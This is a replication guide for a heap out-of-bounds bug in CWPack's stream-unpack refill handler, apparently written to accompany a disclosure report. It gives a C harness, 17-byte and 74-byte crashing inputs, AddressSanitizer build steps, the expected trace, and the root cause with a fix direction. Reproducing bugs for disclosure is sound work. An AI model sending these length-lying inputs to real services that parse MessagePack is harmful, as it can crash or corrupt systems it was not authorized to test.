# CWPack heap OOB — replication guide

A self-contained, copy-paste reproduction of the `negative-size-param` heap out-of-bounds
in CWPack's stream-unpack refill handler. Start from nothing but a shell with `git`,
`clang`, and `python3`. Takes about two minutes.

- **Bug:** `handle_stream_unpack_underflow` (`goodies/basic-contexts/basic_contexts.c:159`)
- **Trigger:** a truncated / length-lying MessagePack stream decoded through the provided
  `stream_unpack_context`
- **Detector:** AddressSanitizer (`-fsanitize=address`)
- **Full analysis + fix:** `CWPack-stream-unpack-negative-size.md`

---

## 0. Prerequisites

- `git`
- A Clang with AddressSanitizer:
  - **macOS:** Homebrew LLVM — `brew install llvm`, then use `/opt/homebrew/opt/llvm/bin/clang`
    (Apple's `/usr/bin/clang` also has ASan and works here).
  - **Linux:** `clang` from your distro (`apt install clang`) — ASan built in.
- `python3` (only to write the 74-byte input; you can also use the `printf` alternative in §3).

## 1. Get the exact source

```sh
git clone https://github.com/clwi/CWPack
cd CWPack
git checkout 833fec9      # the commit this was found on; master is identical (unchanged since 2022)
cd ..
```

## 2. Create the proof of concept

Save as `poc.c` next to the `CWPack/` directory. This is the **simplest documented usage**
of the stream-unpack API — nothing unusual:

```c
/* poc.c — minimal CWPack stream-unpack loop over an untrusted file */
#include <stdio.h>
#include <string.h>
#include "basic_contexts.h"

int main(int argc, char** argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <input>\n", argv[0]); return 2; }
    FILE* f = fopen(argv[1], "rb");
    if (!f) return 0;

    stream_unpack_context suc;
    memset(&suc, 0, sizeof(suc));
    init_stream_unpack_context(&suc, 16, f);   /* small buffer => exercises the refill path */

    while (suc.uc.return_code == CWP_RC_OK)
        cw_unpack_next((cw_unpack_context*)&suc);

    terminate_stream_unpack_context(&suc);
    fclose(f);
    return 0;
}
```

## 3. Create the crashing input

You have two equivalent inputs; **the 17-byte minimal one is recommended** — it is
deterministic, human-readable, and needs no Python or base64.

### 3a. Minimal input (17 bytes) — one line, anyone can run

A `fixstr` header (`0xB6`) that declares a **22-byte** string, followed by only **16** bytes.
The stream promises more than it contains, which is the entire bug:

```sh
printf '\xb6\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' > crash.bin
```

Verify:

```sh
wc -c < crash.bin        # expect: 17
shasum -a 256 crash.bin  # expect: 8a53f4c9249cc5ac4b2f2a7d3c7beca8c7989b4f149bdee864d0402763d34bed
```

The 16 filler bytes are arbitrary — only the *count* matters (fewer than the declared 22).
`make_payload.py` in `CWPack-poc/` regenerates this and prints the one-liner.

### 3b. Original fuzzer input (74 bytes) — optional

The exact bytes AddressSanitizer first crashed on (declares several oversized lengths):

```sh
python3 -c "import base64; open('crash.bin','wb').write(base64.b64decode('BQUF/////////////////////////////////////////////////////////////////////7b//////////////////////wU='))"
shasum -a 256 crash.bin  # expect: dce348de62f29552da54cc15652e2aa032a27e119ac9dfd73c7aa83909703aec
wc -c < crash.bin        # expect: 74
```

Both inputs crash at the same line (`basic_contexts.c:159`); 3a reports `size=-6`, 3b `size=-4`
(the overshoot differs, the bug is identical).

## 4. Build with AddressSanitizer

Link the PoC against CWPack's core (`src/cwpack.c`) and the stream context
(`goodies/basic-contexts/basic_contexts.c`):

**macOS (Homebrew LLVM):**
```sh
/opt/homebrew/opt/llvm/bin/clang -fsanitize=address -g -O1 \
  -ICWPack/goodies/basic-contexts -ICWPack/src \
  poc.c \
  CWPack/goodies/basic-contexts/basic_contexts.c \
  CWPack/src/cwpack.c \
  -o poc
```

**Linux:**
```sh
clang -fsanitize=address -g -O1 \
  -ICWPack/goodies/basic-contexts -ICWPack/src \
  poc.c \
  CWPack/goodies/basic-contexts/basic_contexts.c \
  CWPack/src/cwpack.c \
  -o poc
```

## 5. Run it

```sh
./poc crash.bin
```

## 6. Expected result

The process aborts with an AddressSanitizer report like:

```
==ERROR: AddressSanitizer: negative-size-param: (size=-4)
    #0 ... __asan_memmove
    #1 ... handle_stream_unpack_underflow basic_contexts.c:159
    #2 ... cw_unpack_next cwpack.c:476
    #3 ... main poc.c:15
SUMMARY: AddressSanitizer: negative-size-param basic_contexts.c:159 in handle_stream_unpack_underflow
```

The overrun region was `realloc`'d by an earlier call to the same handler
(`basic_contexts.c:167` / `cwpack.c:510`) — i.e. the read cursor was pushed past the buffer
end on a prior refill, then reused. That is the bug.

## 7. What you just saw (one paragraph)

`init_stream_unpack_context` sets up a 16-byte buffer. As `cw_unpack_next` decodes items, a
declared length in `crash.bin` asks for more bytes than remain in the file. The refill
handler's `fread` returns a **short** count (`0 < l < requested`), but the handler only
special-cases a **zero** read — so it returns `CWP_RC_OK` as if satisfied. The core then
advances `current` by the full requested amount, past `end`. The next refill computes
`remains = end - current`, which is negative and wraps to a huge `size_t`, and hands it to
`memmove`. Fix: fill until the requested bytes are actually available (or fail) — see the
report's §5.

## 8. Cleanup

```sh
rm -f poc poc.o crash.bin
rm -rf CWPack poc.dSYM
```
